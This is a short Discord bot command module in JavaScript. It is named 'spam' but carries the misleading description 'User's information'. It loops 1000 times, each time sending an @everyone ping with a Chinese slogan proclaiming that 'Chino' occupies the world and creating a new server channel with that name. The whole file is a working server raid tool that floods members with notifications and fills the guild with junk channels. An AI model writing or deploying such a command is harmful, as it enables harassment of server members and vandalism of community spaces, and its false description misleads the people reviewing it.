module.exports = {
	name: 'spam',
	description: "User's information ",
	execute(message, args) {
		var i;
		for (i = 0; i < 1000; i++) {
            message.channel.send(`@everyone 智乃萬歲 智乃佔領全世界`);
            message.guild.channels.create('智乃萬歲 智乃佔領全世界', { reason: '智乃萬歲 智乃佔領全世界' })
            
        };
	},
};